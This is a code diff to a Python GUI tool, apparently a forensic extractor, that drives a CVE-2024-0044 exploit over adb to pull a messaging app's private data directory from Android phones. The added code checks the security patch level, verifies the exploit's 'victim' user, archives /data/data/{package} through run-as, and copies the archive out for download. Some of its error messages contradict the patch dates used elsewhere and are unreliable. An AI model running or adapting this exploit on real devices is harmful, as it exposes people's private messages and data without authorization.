@@ -925,6 +925,48 @@ class AndroidExtractorGUI:
             self.write_log(f"UID: {uid}")
             self.write_log("=" * 80)
             
+            # Detectar nivel de parche de seguridad
+            self.write_log("Checking device security patch level...")
+            patch_level, _, _ = self.run_adb_command("getprop ro.build.version.security_patch", shell=True)
+            patch_level = patch_level.strip()
+            self.write_log(f"Security patch level: {patch_level}")
+            
+            # Advertir si el parche es posterior a marzo 2024 (o octubre 2024 para el bypass patch)
+            if patch_level:
+                try:
+                    year, month = patch_level.split('-')[:2]
+                    patch_date = int(year) * 12 + int(month)
+                    first_patch_date = 2024 * 12 + 3  # Marzo 2024 - primer parche
+                    final_patch_date = 2024 * 12 + 10  # Octubre 2024 - parche del bypass
+                    
+                    if patch_date >= final_patch_date:
+                        self.write_log(f"WARNING: Device patch ({patch_level}) is AFTER October 2024", "WARNING")
+                        self.write_log("This device is PATCHED against CVE-2024-0044 (including bypass)", "WARNING")
+                        self.write_log("Extraction will fail", "WARNING")
+                        
+                        response = messagebox.askyesno(
+                            "Device is Patched",
+                            f"WARNING: This device has security patch level {patch_level}\n\n"
+                            f"CVE-2024-0044 was fully patched in October 2024.\n"
+                            f"Your device is PATCHED (including bypass).\n\n"
+                            f"The extraction will definitely fail.\n\n"
+                            f"Do you want to continue anyway?",
+                            icon='warning'
+                        )
+                        
+                        if not response:
+                            self.write_log("User cancelled extraction due to patch warning", "INFO")
+                            return
+                    elif patch_date >= first_patch_date:
+                        self.write_log(f"INFO: Device patch ({patch_level}) has first patch (March 2024)", "WARNING")
+                        self.write_log("Bypass exploit may still work (patched October 2024)", "INFO")
+                    else:
+                        self.write_log(f"Device patch ({patch_level}) is VULNERABLE to CVE-2024-0044", "SUCCESS")
+                except:
+                    self.write_log("Could not parse security patch date", "WARNING")
+            
+            self.write_log("=" * 80)
+            
             apk_path = "F-Droid.apk"
             if not os.path.exists(apk_path):
                 self.write_log(f"APK file not found: {apk_path}", "ERROR")
@@ -964,23 +1006,136 @@ pm install -i "$PAYLOAD" /data/local/tmp/{apk_path}
             self.write_log("Exploit executed", "SUCCESS")
             time.sleep(2)
             
+            # VERIFICACIÓN DEL EXPLOIT - NUEVO
+            self.write_log("Verifying exploit success...")
+            check_victim, check_stderr, check_code = self.run_adb_command("run-as victim id", shell=True)
+            self.write_log(f"Victim user check stdout: {check_victim}")
+            self.write_log(f"Victim user check stderr: {check_stderr}")
+            self.write_log(f"Victim user check exit code: {check_code}")
+            
+            if check_code != 0 or "unknown" in check_victim.lower() or "not found" in check_victim.lower():
+                self.write_log("EXPLOIT FAILED: 'victim' user was not created", "ERROR")
+                self.write_log("This device may be patched against CVE-2024-0044", "ERROR")
+                messagebox.showerror("Exploit Failed", 
+                                   "CVE-2024-0044 exploit failed to create 'victim' user.\n\n"
+                                   "Possible causes:\n"
+                                   "• Device has security patch after October 2022\n"
+                                   "• CVE-2024-0044 has been patched\n"
+                                   "• SELinux policies are blocking the exploit\n\n"
+                                   "Check the log file for details.")
+                return
+            else:
+                self.write_log(f"EXPLOIT SUCCESSFUL: victim user created with UID: {check_victim.strip()}", "SUCCESS")
+            
             self.update_progress(3, 7, "Step 3/6: Creating backup archive...")
             self.write_log("STEP 3: Creating backup archive...")
-            commands = f'''mkdir -p /data/local/tmp/wa/
-touch /data/local/tmp/wa/wa.tar
-chmod -R 0777 /data/local/tmp/wa/
-run-as victim tar -cf /data/local/tmp/wa/wa.tar {package}
-exit'''
             
-            subprocess.run(["adb", "shell"], input=commands, capture_output=True, text=True, timeout=60)
+            # MÉTODO CORREGIDO: Crear TAR dentro del directorio de la app
+            # Luego copiarlo a /data/local/tmp usando redirección
             
-            stdout, stderr, code = self.run_adb_command("ls -lh /data/local/tmp/wa/wa.tar", shell=True)
+            self.write_log("Creating TAR inside app directory (where we have permissions)...")
+            
+            # Paso 3.1: Crear TAR dentro de /data/data/package/
+            tar_internal_path = f"/data/data/{package}/backup.tar"
+            
+            commands = f'''run-as victim sh << 'EOF'
+cd /data/data/{package}
+tar -cf {tar_internal_path} .
+chmod 777 {tar_internal_path}
+exit
+EOF'''
+            
+            self.write_log(f"Creating TAR at: {tar_internal_path}")
+            result = subprocess.run(["adb", "shell"], input=commands, capture_output=True, text=True, timeout=120)
+            
+            if result.stdout:
+                self.write_log(f"TAR creation stdout: {result.stdout}")
+            if result.stderr:
+                self.write_log(f"TAR creation stderr: {result.stderr}", "WARNING")
+            
+            # Verificar que el TAR se creó dentro de la app
+            stdout, stderr, code = self.run_adb_command(f"run-as victim ls -lh {tar_internal_path}", shell=True)
+            self.write_log(f"Internal TAR verification: {stdout}")
+            
             if code != 0:
-                self.write_log("Failed to create backup", "ERROR")
-                messagebox.showerror("Error", "Failed to create backup")
+                self.write_log("Failed to create TAR inside app directory", "ERROR")
+                messagebox.showerror("Error", 
+                                   "Failed to create backup archive inside app directory.\n\n"
+                                   "Check the log file for details.")
                 return
             
-            self.write_log(f"Backup created: {stdout.strip()}", "SUCCESS")
+            # Verificar si está vacío
+            if " 0 " in stdout or " 0B " in stdout:
+                self.write_log("WARNING: TAR created but is EMPTY", "ERROR")
+                messagebox.showerror("Error", 
+                                   "Backup archive was created but is empty (0 bytes).\n\n"
+                                   "The app may not have any data, or tar failed to process files.")
+                return
+            
+            self.write_log(f"TAR created successfully: {stdout.strip()}", "SUCCESS")
+            
+            # Paso 3.2: Copiar el TAR a /data/local/tmp usando cat (método que funciona)
+            self.write_log("Copying TAR to /data/local/tmp...")
+            
+            # Crear directorio de destino con permisos completos
+            self.run_adb_command("mkdir -p /data/local/tmp/wa/", shell=True)
+            self.run_adb_command("chmod 0777 /data/local/tmp/wa/", shell=True)
+            
+            # Copiar usando cat (redirección de stdout)
+            copy_command = f"run-as victim cat {tar_internal_path} > /data/local/tmp/wa/wa.tar"
+            stdout, stderr, code = self.run_adb_command(copy_command, shell=True)
+            
+            self.write_log(f"Copy command: {copy_command}")
+            self.write_log(f"Copy exit code: {code}")
+            if stdout:
+                self.write_log(f"Copy stdout: {stdout}")
+            if stderr:
+                self.write_log(f"Copy stderr: {stderr}")
+            
+            # Limpiar TAR interno
+            self.run_adb_command(f"run-as victim rm {tar_internal_path}", shell=True)
+            self.write_log("Cleaned up internal TAR file")
+            
+            stdout, stderr, code = self.run_adb_command("ls -lh /data/local/tmp/wa/wa.tar", shell=True)
+            self.write_log(f"TAR file details: {stdout}")
+            
+            if code != 0:
+                self.write_log("Failed to create backup - TAR file not found", "ERROR")
+                messagebox.showerror("Error", 
+                                   "Failed to create backup archive.\n\n"
+                                   "The TAR file was not created on the device.\n"
+                                   "Check the log file for details.")
+                return
+            
+            # Verificar si el archivo está vacío (0 bytes)
+            if " 0 " in stdout or " 0B " in stdout:
+                self.write_log("WARNING: TAR file is EMPTY (0 bytes)", "ERROR")
+                self.write_log("This indicates the exploit did not successfully access app data", "ERROR")
+                
+                # Diagnóstico adicional
+                self.write_log("Running additional diagnostics...")
+                
+                # Verificar si el paquete existe
+                pkg_check, _, _ = self.run_adb_command(f"run-as victim ls -la /data/data/{package} 2>&1", shell=True)
+                self.write_log(f"Package directory check: {pkg_check}")
+                
+                # Verificar permisos SELinux
+                selinux_check, _, _ = self.run_adb_command("getenforce", shell=True)
+                self.write_log(f"SELinux status: {selinux_check}")
+                
+                messagebox.showerror("Extraction Failed - Empty TAR", 
+                                   f"The backup file was created but is EMPTY (0 bytes).\n\n"
+                                   f"This means CVE-2024-0044 exploit failed to access app data.\n\n"
+                                   f"Possible causes:\n"
+                                   f"• Security patch has fixed this vulnerability\n"
+                                   f"• SELinux is blocking access: {selinux_check.strip()}\n"
+                                   f"• App data protection is enabled\n\n"
+                                   f"Your device patch: March 2023 (likely patched)\n"
+                                   f"Vulnerable devices: October 2022 or earlier\n\n"
+                                   f"Check log file for detailed diagnostics.")
+                return
+            
+            self.write_log(f"Backup created successfully: {stdout.strip()}", "SUCCESS")
             
             self.update_progress(4, 7, "Step 4/6: Downloading wa.tar and calculating HASH...")
             self.write_log("STEP 4: Downloading backup from device...")
